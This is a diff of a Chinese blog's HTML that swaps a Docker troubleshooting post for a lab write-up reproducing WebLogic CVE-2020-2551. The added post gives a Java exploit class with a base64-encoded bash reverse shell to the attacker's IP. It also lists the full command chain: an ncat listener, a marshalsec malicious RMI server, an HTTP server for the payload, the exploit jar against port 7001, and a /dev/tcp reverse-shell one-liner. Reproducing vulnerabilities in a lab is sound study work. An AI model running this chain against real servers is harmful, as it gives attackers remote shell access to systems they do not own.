@@ -16,23 +16,25 @@
   <meta name="author" content="manic">
   <meta name="keywords" content="">
   
-    <meta name="description" content="报错 1231.docker: Error response from daemon: Get &quot;https:&#x2F;&#x2F;registry-1.docker.io&#x2F;v2&#x2F;&quot;: net&#x2F;http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers).2">
+    <meta name="description" content="手动搭建的weblogic漏洞环境，参考文章：https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_41617034&#x2F;article&#x2F;details&#x2F;118799208 一开始使用Ubuntu的NAT环境，但是没有成功，最后按照网上的说法应该是NAT模式不大行，然后使用的是桥接模式了 Ubuntu-IP：172.16.1.168 物理机-IP（攻击机）：172.16.1.129 使用到的工具1.exp">
 <meta property="og:type" content="article">
-<meta property="og:title" content="docker拉取镜像时环境报错">
-<meta property="og:url" content="http://example.com/2025/02/06/docker%E6%8B%89%E5%8F%96%E9%95%9C%E5%83%8F%E6%97%B6%E7%8E%AF%E5%A2%83%E6%8A%A5%E9%94%99/index.html">
+<meta property="og:title" content="weblogic_2020-2551">
+<meta property="og:url" content="http://example.com/2025/02/07/weblogic-2020-2551/index.html">
 <meta property="og:site_name" content="manic的小站">
-<meta property="og:description" content="报错 1231.docker: Error response from daemon: Get &quot;https:&#x2F;&#x2F;registry-1.docker.io&#x2F;v2&#x2F;&quot;: net&#x2F;http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers).2">
+<meta property="og:description" content="手动搭建的weblogic漏洞环境，参考文章：https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_41617034&#x2F;article&#x2F;details&#x2F;118799208 一开始使用Ubuntu的NAT环境，但是没有成功，最后按照网上的说法应该是NAT模式不大行，然后使用的是桥接模式了 Ubuntu-IP：172.16.1.168 物理机-IP（攻击机）：172.16.1.129 使用到的工具1.exp">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/img/%E5%B0%81%E9%9D%A2.png">
-<meta property="article:published_time" content="2025-02-06T03:22:40.000Z">
-<meta property="article:modified_time" content="2025-02-06T03:32:45.392Z">
+<meta property="article:published_time" content="2025-02-07T09:08:37.000Z">
+<meta property="article:modified_time" content="2025-02-07T09:19:46.692Z">
 <meta property="article:author" content="manic">
+<meta property="article:tag" content="weblogic">
+<meta property="article:tag" content="CVE_2020_2551">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://example.com/img/%E5%B0%81%E9%9D%A2.png">
   
   
   
-  <title>docker拉取镜像时环境报错 - manic的小站</title>
+  <title>weblogic_2020-2551 - manic的小站</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -219,7 +221,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="docker拉取镜像时环境报错"></span>
+            <span id="subtitle" data-typed-text="weblogic_2020-2551"></span>
           
         </div>
 
@@ -230,8 +232,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-02-06 11:22" pubdate>
-          2025年2月6日 上午
+        <time datetime="2025-02-07 17:08" pubdate>
+          2025年2月7日 下午
         </time>
       </span>
     
@@ -242,7 +244,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.3k 字
+          1.4k 字
         
       </span>
     
@@ -253,7 +255,7 @@
         
         
         
-          20 分钟
+          12 分钟
         
       </span>
     
@@ -299,55 +301,42 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">docker拉取镜像时环境报错</h1>
+            <h1 style="display: none">weblogic_2020-2551</h1>
             
             
               <div class="markdown-body">
                 
-                <p>报错</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">1.docker: <span class="hljs-built_in">Error</span> response <span class="hljs-keyword">from</span> daemon: <span class="hljs-built_in">Get</span> <span class="hljs-string">&quot;https://registry-1.docker.io/v2/&quot;</span>: net/http: request canceled <span class="hljs-keyword">while</span> waiting <span class="hljs-keyword">for</span><span class="hljs-built_in"> connection </span>(Client.Timeout exceeded <span class="hljs-keyword">while</span> awaiting headers).<br><br>2.<span class="hljs-built_in">Error</span> response <span class="hljs-keyword">from</span> daemon: <span class="hljs-built_in">Get</span> <span class="hljs-string">&quot;https://registry-1.docker.io/v2/&quot;</span>: dial tcp ip: connect:<span class="hljs-built_in"> connection </span>refused<br></code></pre></td></tr></table></figure>
+                <p>手动搭建的weblogic漏洞环境，参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41617034/article/details/118799208">https://blog.csdn.net/qq_41617034/article/details/118799208</a></p>
+<p>一开始使用Ubuntu的NAT环境，但是没有成功，最后按照网上的说法应该是NAT模式不大行，然后使用的是桥接模式了</p>
+<p>Ubuntu-IP：172.16.1.168</p>
+<p>物理机-IP（攻击机）：172.16.1.129</p>
+<h3 id="使用到的工具"><a href="#使用到的工具" class="headerlink" title="使用到的工具"></a>使用到的工具</h3><p>1.exp.java文件</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">exp</span> &#123;<br>        <span class="hljs-keyword">static</span>&#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                        java.lang.Runtime.getRuntime().exec(<span class="hljs-string">&quot;bash -c &#123;echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE3Mi4xNi4xLjEyOS8zMzMzIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);<br>                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                        e.printStackTrace();<br>                &#125;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 
+<p>2.marshalsec-0.0.3-SNAPSHOT-all.jar</p>
+<p>3.weblogic_CVE_2020_2551.jar</p>
+<h3 id="使用到的命令"><a href="#使用到的命令" class="headerlink" title="使用到的命令"></a>使用到的命令</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">ncat -lvnp <span class="hljs-number">3333</span><br>javac exp.java -source <span class="hljs-number">1.6</span> -target <span class="hljs-number">1.6</span><br>java -cp marshalsec-<span class="hljs-number">0.0</span>.<span class="hljs-number">3</span>-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer <span class="hljs-string">&quot;http://172.16.1.129:8082/#exp&quot;</span> <span class="hljs-number">1099</span><br>python3 -m http.server <span class="hljs-number">8082</span><br>java -jar weblogic_CVE_2020_2551.jar <span class="hljs-number">172.16</span>.<span class="hljs-number">1.168</span> <span class="hljs-number">7001</span> rmi:<span class="hljs-regexp">//</span><span class="hljs-number">172.16</span>.<span class="hljs-number">1.129</span>:<span class="hljs-number">1099</span>/exp<br><span class="hljs-regexp">/bin/</span>bash -i &gt;&amp; <span class="hljs-regexp">/dev/</span>tcp<span class="hljs-regexp">/172.16.1.129/</span><span class="hljs-number">3333</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
 
+<h3 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h3><p>1.攻击机开启nc</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ncat</span> -lvnp <span class="hljs-number">3333</span><br></code></pre></td></tr></table></figure>
 
-<h3 id="换源："><a href="#换源：" class="headerlink" title="换源："></a>换源：</h3><p>1.<strong>修改<code>/etc/docker/daemon.json</code>文件</strong>    </p>
-<blockquote>
-<p> vi &#x2F;etc&#x2F;docker&#x2F;daemon.json</p>
-</blockquote>
-<p> 2.<strong>导入镜像</strong></p>
-<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs prolog">&#123;<br>    <span class="hljs-string">&quot;registry-mirrors&quot;</span>: [<br>        <span class="hljs-string">&quot;https://docker.registry.cyou&quot;</span>,<br>        <span class="hljs-string">&quot;https://docker.chenby.cn&quot;</span>,<br>        <span class="hljs-string">&quot;https://docker.actima.top&quot;</span>,<br>        <span class="hljs-string">&quot;https://dockerhub.icu&quot;</span>,<br>        <span class="hljs-string">&quot;https://atomhub.openatom.cn&quot;</span>,<br>        <span class="hljs-string">&quot;https://dockerproxy.cn&quot;</span>,<br>        <span class="hljs-string">&quot;https://docker.nastool.de&quot;</span>,<br>        <span class="hljs-string">&quot;https://docker.mirrors.ustc.edu.cn&quot;</span>,<br>        <span class="hljs-string">&quot;https://hub-mirror.c.163.com&quot;</span>,<br>        <span class="hljs-string">&quot;https://reg-mirror.qiniu.com&quot;</span>      <br>    ]<br>&#125; <br></code></pre></td></tr></table></figure>
+<p><img src="/img/weblogic-2020-2551/image-20250207161801281.png" srcset="/img/loading.gif" lazyload alt="image-20250207161801281"></p>
+<p>2.编译exp.java文件，生成.class文件</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">javac</span> exp.java -source <span class="hljs-number">1</span>.<span class="hljs-number">6</span> -target <span class="hljs-number">1</span>.<span class="hljs-number">6</span><br></code></pre></td></tr></table></figure>
 
-<p>3.<strong>重启</strong></p>
-<blockquote>
-<p>systemctl daemon-reload<br>systemctl restart docker</p>
-</blockquote>
-<p>重启的时候可能会报错</p>
-<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Job <span class="hljs-keyword">for</span> docker.service failed because <span class="hljs-keyword">the</span> control <span class="hljs-built_in">process</span> exited <span class="hljs-keyword">with</span> error code.<br>See <span class="hljs-string">&quot;systemctl status docker.service&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;journalctl -xeu docker.service&quot;</span> <span class="hljs-keyword">for</span> details.<br></code></pre></td></tr></table></figure>
+<p>3.在有exp.class文件夹下启一个web服务</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> -m http.server <span class="hljs-number">8082</span><br></code></pre></td></tr></table></figure>
 
-<p>输入dockerd命令返回下面的问题，大概率是json文件里面有 制表符（以及其他非法字符）</p>
-<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">unable <span class="hljs-built_in">to</span> configure <span class="hljs-keyword">the</span> Docker daemon <span class="hljs-keyword">with</span> <span class="hljs-built_in">file</span> /etc/docker/daemon.json: invalid <span class="hljs-keyword">character</span> <span class="hljs-string">&#x27;ã&#x27;</span> looking <span class="hljs-keyword">for</span> beginning <span class="hljs-keyword">of</span> object key <span class="hljs-keyword">string</span><br></code></pre></td></tr></table></figure>
+<p><img src="/img/weblogic-2020-2551/image-20250207162223192.png" srcset="/img/loading.gif" lazyload alt="image-20250207162223192"></p>
+<p>4.使用marshalsec起一个恶意的RMI服务</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -cp marshalsec-<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3</span>-SNAPSHOT-<span class="hljs-literal">all</span>.jar marshalsec.jndi.RMIRefServer <span class="hljs-string">&quot;http://172.16.1.129:8082/#exp&quot;</span> <span class="hljs-number">1099</span><br></code></pre></td></tr></table></figure>
 
-<h3 id="修改DNS服务配置"><a href="#修改DNS服务配置" class="headerlink" title="修改DNS服务配置"></a>修改DNS服务配置</h3><p>1.<strong>如果DNS服务器出现问题，也可能导致拉取镜像报错。可以通过查看&#x2F;etc&#x2F;resolv.conf文件来检查DNS服务器设置</strong></p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/etc/</span>resolv.conf<br></code></pre></td></tr></table></figure>
+<p>5.使用POC攻击，反弹shell</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -jar weblogic_CVE_2020_2551.jar <span class="hljs-number">172.16.1.168</span> <span class="hljs-number">7001</span> rmi://<span class="hljs-number">172.16.1.129:1099</span>/exp<br></code></pre></td></tr></table></figure>
 
-<p>2.<strong>如果显示nameserver后面没有IP地址，或者显示的IP地址有问题，可以尝试修改该文件。例如，可以将nameserver 192.168.100.2注释掉，新增nameserver 114.114.114.114和nameserver 8.8.8.8</strong></p>
-<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment">#nameserver 192.168.100.2</span><br><span class="hljs-attribute">nameserver</span> <span class="hljs-number">114.114.114.114</span><br>nameserver <span class="hljs-number">8.8.8.8</span><br></code></pre></td></tr></table></figure>
-
-<p>3.应该还有个重启网络服务的操作，但是我的kali重启报错，然后我直接重启的kali，配置也还在（昨天换完源修改完DNS配置以后是可以拉镜像的，但是今天再拉就不成功了，然后就有了下面的内容）</p>
-<h3 id="给docker配置一个代理"><a href="#给docker配置一个代理" class="headerlink" title="给docker配置一个代理"></a>给docker配置一个代理</h3><p>1.<strong>在 &#x2F;etc&#x2F;systemd&#x2F;system 目录下创建 docker.service.d 目录</strong></p>
-<p>sudo mkdir -p &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;docker.service.d</p>
-<p>2.<strong>在该目录下创建 http-proxy.conf 文件</strong></p>
-<p>sudo touch &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;docker.service.d&#x2F;http-proxy.conf</p>
-<p>3.<strong>编辑该文件并添加下面的内容</strong></p>
-<p>sudo vim &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;docker.service.d&#x2F;http-proxy.conf</p>
-<p>4.<strong>根据自身需要添加下面的内容并替换为实际的配置，一般只需要加 HTTP_PROXY 和 HTTPS_PROXY</strong></p>
-<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Service]</span><br><span class="hljs-attr">Environment</span>=<span class="hljs-string">&quot;HTTP_PROXY=http://proxy.example.com:8080/&quot;</span><br><span class="hljs-attr">Environment</span>=<span class="hljs-string">&quot;HTTPS_PROXY=http://proxy.example.com:8080/&quot;</span><br></code></pre></td></tr></table></figure>
-
-<p>kali用的NAT，我配的物理机地址+物理机代理工具局域网http端口10803(172.16.1.129:10803)</p>
-<p>5.<strong>重新启动 Docker&#96;</strong></p>
-<blockquote>
-<p>sudo systemctl daemon-reload<br>sudo systemctl restart docker</p>
-</blockquote>
-<p>成功拉取镜像</p>
+<p><img src="/img/weblogic-2020-2551/image-20250207170019637.png" srcset="/img/loading.gif" lazyload alt="image-20250207170019637"></p>
+<p>最后的反弹shell，POC攻击的返回结果依然是“没有回显   自行检测”，但是反弹成功</p>
+<p><img src="/img/weblogic-2020-2551/image-20250207170254075.png" srcset="/img/loading.gif" lazyload alt="image-20250207170254075"></p>
 
                 
               </div>
@@ -366,7 +355,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/docker/" class="category-chain-item">docker</a>
+  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="category-chain-item">漏洞复现</a>
   
   
 
@@ -378,6 +367,15 @@
     </div>
   
   
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/weblogic/">#weblogic</a>
+      
+        <a href="/tags/CVE-2020-2551/">#CVE_2020_2551</a>
+      
+    </div>
+  
 </div>
 
 
@@ -386,8 +384,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>docker拉取镜像时环境报错</div>
-      <div>http://example.com/2025/02/06/docker拉取镜像时环境报错/</div>
+      <div>weblogic_2020-2551</div>
+      <div>http://example.com/2025/02/07/weblogic-2020-2551/</div>
     </div>
     <div class="license-meta">
       
@@ -399,7 +397,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2025年2月6日</div>
+          <div>2025年2月7日</div>
         </div>
       
       
@@ -431,18 +429,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/02/07/weblogic-2020-2551/" title="weblogic_2020-2551">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">weblogic_2020-2551</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/05/20/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80/" title="免杀基础">
-                        <span class="hidden-mobile">免杀基础</span>
+                      <a href="/2025/02/06/docker%E6%8B%89%E5%8F%96%E9%95%9C%E5%83%8F%E6%97%B6%E7%8E%AF%E5%A2%83%E6%8A%A5%E9%94%99/" title="docker拉取镜像时环境报错">
+                        <span class="hidden-mobile">docker拉取镜像时环境报错</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
